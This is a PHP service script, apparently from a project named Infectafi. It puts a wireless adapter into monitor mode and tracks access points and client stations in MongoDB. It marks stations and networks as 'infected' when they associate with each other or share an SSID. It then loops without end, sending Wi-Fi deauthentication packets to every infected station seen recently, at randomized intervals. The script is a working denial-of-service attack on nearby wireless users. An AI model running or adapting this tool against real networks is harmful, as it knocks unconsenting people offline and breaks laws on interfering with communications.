#!/usr/bin/env php
<?php

require_once __DIR__ . '/vendor/spidermatt/infectafi/src/Infectafi/Service/Options.php';

// Load runtime option overrides from the command line (if any present)
$opts = \Spidermatt\Infectafi\Service\Options::getOptions(realpath(__DIR__));

// Import the autoload system for package loading
require $opts['vendor-path'] . '/autoload.php';

// Imports
use Spidermatt\Infectafi\Db;
use Spidermatt\Infectafi\Debug;

// Define MongoDB Config
define('MONGODM_CONFIG', $opts['config-path'] . '/mongodb.json');

// Load application configuration
$config = \Spidermatt\Infectafi\Service\ConfigLoader::load($opts['config-path'], $opts['config-file']);

// Set debug mode on debug manager from configuration
Debug::setDebugMode(isset($config->service->debug) ? $config->service->debug : false);
Debug::setPrintLevel($config->attack->log_level);

// Log $opts values to log
foreach ($opts as $key => $value) {
	Debug::log(Debug::LOG_DEBUG, 'Option [' . $key . ']: ' . $value);
}

// Log config file contents
Debug::log(Debug::LOG_DEBUG, 'Service Config: ' . json_encode($config));

while (true) {
	$start = new DateTime();

	Debug::log(Debug::LOG_DEBUG, 'Starting service cycle...');

	// Setup database connection and database
	$mongoClient = new MongoDB\Client($config->db->url);
	Db::setMongoClientAndDb($mongoClient, $config->db->name);

	Debug::log(Debug::LOG_DEBUG, 'Starting monitor on ' . $config->adapter);

	Debug::log(Debug::LOG_DEBUG, \Spidermatt\Infectafi\Airmon::startMonitor($config->adapter));

	Debug::log(Debug::LOG_INFO, 'Attack Start: ' . ($startString = $start->format('Y-m-d H:i:s.u')));

	// This will only run for the duration of the configured limit
	while (time() - strtotime($startString) < $config->attack->limit) {
		$infectedAPs = [];
		$infectedSSIDs = [];
		$infectedStations = [];

		foreach(Db::getKnownAccessPointsCollection()->find() as $ap)
		{
			if(isset($ap['infected']) && $ap['infected'])
			{
				$infectedAPs[] = $ap['bssid'];
				$infectedSSIDs[] = $ap['essid'];
				Debug::log(Debug::LOG_TRACE3, 'AP ' . $ap->bssid . ' is infected.');
			} else {
				Debug::log(Debug::LOG_TRACE3, 'AP ' . $ap->bssid . ' is not infected.');
			}
		}

		foreach (Db::getKnownStationsCollection()->find() as $station) {
			if (isset($station['infected']) && $station['infected']) {
				$infectedStations[] = $station['macAddress'];

				Debug::log(Debug::LOG_TRACE3, 'Station ' . $station['macAddress'] . ' is infected.');

				if (preg_match('/([a-fA-F0-9]{2}[:|\-]?){6}/', $station['bssid']) == 1
					&& !in_array($station['bssid'], $infectedAPs)) {

					Debug::log(Debug::LOG_INFO, 'Infecting AP ' . $station['bssid'] . ' by association to infected station ' . $station['macAddress']);

					Db::getKnownAccessPointsCollection()->updateOne(['bssid' => $station['bssid']], ['$set' => ['infected' => true]]);
				}
			} else {
				Debug::log(Debug::LOG_TRACE3, 'Station ' . $station['macAddress'] . ' is not infected.');

				if (preg_match('/([a-fA-F0-9]{2}[:|\-]?){6}/', $station['bssid']) == 1
					&& in_array($station['bssid'], $infectedAPs)) {

					Debug::log(Debug::LOG_INFO, 'Infecting station ' . $station['macAddress'] . ' by association to infected AP ' . $station['bssid']);

					Db::getKnownStationsCollection()->updateOne(['macAddress' => $station['macAddress']], ['$set' => ['infected' => true]]);
				}
			}
		}

		foreach(Db::getKnownAccessPointsCollection()->find() as $ap)
		{
			Debug::log(Debug::LOG_TRACE3, 'Searching for SSID cross-contamination for ' . $ap['essid']);
			if ((!isset($ap['infected']) || !$ap['infected'])
				&& in_array($ap['essid'], $infectedSSIDs)) {

				Debug::log(Debug::LOG_INFO, 'Infecting AP ' . $ap['bssid'] . ' by use of infected SSID ' . $ap['essid']);

				Db::getKnownAccessPointsCollection()->updateOne(['bssid' => $ap['bssid']], ['$set' => ['infected' => true]]);
			}
		}

		foreach (Db::getKnownStationsCollection()->find() as $station) {
			Debug::log(Debug::LOG_TRACE2, 'Processing station ' . $station['macAddress']);

			if (isset($station['infected']) && $station['infected']) {

				if (preg_match('/([a-fA-F0-9]{2}[:|\-]?){6}/', $station['bssid']) == 1) {

					if (time() - strtotime($station['lastRx']) < $config->attack->attack_inactivity_ceil) {
						if (!isset($station['attackInterval'])
							|| time() - strtotime($station['lastAttack'])
							> $station['attackInterval']) {

							Debug::log(Debug::LOG_INFO, 'Sending deauth packet to ' . $station['macAddress'] . ' associated to ' . $station['bssid']);

							Debug::log(Debug::LOG_DEBUG, \Spidermatt\Infectafi\Aireplay::sendDeauth($station['bssid'], $station['macAddress'], $config->adapter));

							$station['lastAttack'] = (new DateTime())->format('Y-m-d H:i:s.u');
							$station['attackInterval'] = rand($config->attack->intervalFloor, $config->attack->intervalCeiling);

							Debug::log(Debug::LOG_TRACE3, 'Updating station ' . $station['macAddress'] . ' in database');
							Db::getKnownStationsCollection()->updateOne(['macAddress' => $station['macAddress']], ['$set' => $station]);

							Debug::log(Debug::LOG_INFO, 'New attack interval for ' . $station['macAddress'] . ' - ' . $station['attackInterval'] . ' seconds');
						}
					}else{
						Debug::log(Debug::LOG_TRACE3, 'Station ' . $station['macAddress'] . ' not visible for more than ' . $config->attack->attack_inactivity_ceil . ' seconds');
					}
				} else {
					Debug::log(Debug::LOG_TRACE3, 'Station ' . $station['macAddress'] . ' not associated to AP');
				}
			} else {
				Debug::log(Debug::LOG_TRACE3, 'Station ' . $station['macAddress'] . ' not infected');
			}
		}

		Debug::log(Debug::LOG_TRACE2, "Sleeping for 1 second");
		sleep(1);
	}

	Debug::log(Debug::LOG_DEBUG, 'Stopping monitor on ' . $config->adapter);

	Debug::log(Debug::LOG_DEBUG, \Spidermatt\Infectafi\Airmon::stopMonitor($config->adapter));

	Debug::log(Debug::LOG_DEBUG, 'Completed service cycle.');

	Debug::log(Debug::LOG_DEBUG, 'Sleeping for ' . $config->service->restartDelay->afterComplete . ' seconds...');

	sleep($config->service->restartDelay->afterComplete);
}